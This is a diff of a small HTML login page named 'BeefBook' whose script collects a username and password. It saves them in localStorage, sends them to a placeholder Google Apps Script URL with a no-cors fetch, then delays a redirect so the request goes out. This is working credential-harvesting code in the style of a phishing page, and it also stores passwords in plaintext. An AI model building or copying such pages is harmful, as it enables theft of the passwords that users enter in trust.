@@ -5,7 +5,7 @@
   <title>BeefBook</title>
 </head>
 <body style="background-color: Violet;">
-  <h1 style="font-family: Verdana;">BeefBook1</h1>
+  <h1 style="font-family: Verdana;">BeefBook2</h1>
 
   <form id="submitForm">
     <label>Username:</label><br>
@@ -18,30 +18,29 @@
   </form>
 
   <script>
-    const URL = 'PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE';
+  document.getElementById('submitForm').addEventListener('submit', (e) => {
+    e.preventDefault();
 
-    document.getElementById('submitForm').addEventListener('submit', (e) => {
-      e.preventDefault();
+    const uname = document.getElementById('uname').value.trim();
+    const code = document.getElementById('code').value.trim();
 
-      const uname = document.getElementById('uname').value.trim();
-      const code = document.getElementById('code').value.trim();
+    // Save locally for logged-in page
+    localStorage.setItem('username', uname);
+    localStorage.setItem('code', code);
 
-      // 1️⃣ Save locally for logged-in page
-      localStorage.setItem('username', uname);
-      localStorage.setItem('code', code);
-
-      // 2️⃣ Send data to Google Sheets (your existing working fetch)
-      fetch(URL, {
-        method: 'POST',
-        mode: 'no-cors', // works with your existing script
-        body: JSON.stringify({ username: uname, password: code })
-      });
-
-      // 3️⃣ Redirect after a tiny delay so fetch can fire
-      setTimeout(() => {
-        window.location.href = './BBlogedin.html';
-      }, 300); // 300ms is enough
+    // Send to Sheets (your working fetch)
+    fetch('YOUR_GOOGLE_SCRIPT_URL_HERE', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify({ username: uname, password: code })
     });
-  </script>
+
+    // Delay redirect slightly to ensure fetch actually fires
+    setTimeout(() => {
+      window.location.href = './BBlogedin.html';
+    }, 500); // half a second is plenty
+  });
+</script>
+
 </body>
 </html>
